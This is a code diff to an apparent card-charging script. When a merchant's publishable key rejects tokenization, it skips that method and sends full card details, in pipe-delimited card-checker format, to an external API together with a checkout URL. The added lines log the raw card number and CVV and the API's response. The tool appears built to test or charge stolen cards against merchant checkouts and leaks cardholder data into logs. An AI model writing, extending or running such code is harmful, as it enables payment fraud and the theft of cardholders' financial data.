@@ -63,14 +63,21 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
             # Check if key is restricted
             if "unsupported for publishable key tokenization" in error_msg.lower() or "tokenization" in error_msg.lower():
                 logger.info("⚠️ Restricted key detected - skipping to Method 2 (API)")
+                logger.info(f"🔍 checkout_url param: {checkout_url}")
                 
                 # Skip Method 1, go directly to Method 2
                 if checkout_url:
                     try:
                         card_str = f"{card['cc']}|{card['month']}|{card['year']}{card['cvv']}"
                         
+                        logger.info(f"🔗 Calling API: {API_URL}")
+                        logger.info(f"📦 URL: {checkout_url}")
+                        logger.info(f"💳 Card: {card_str}")
+                        
                         async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
                             api_result = await r.json()
+                        
+                        logger.info(f"📥 API Response: {api_result}")
                         
                         api_status = api_result.get("status", "error")
                         api_msg = api_result.get("msg", "No response")
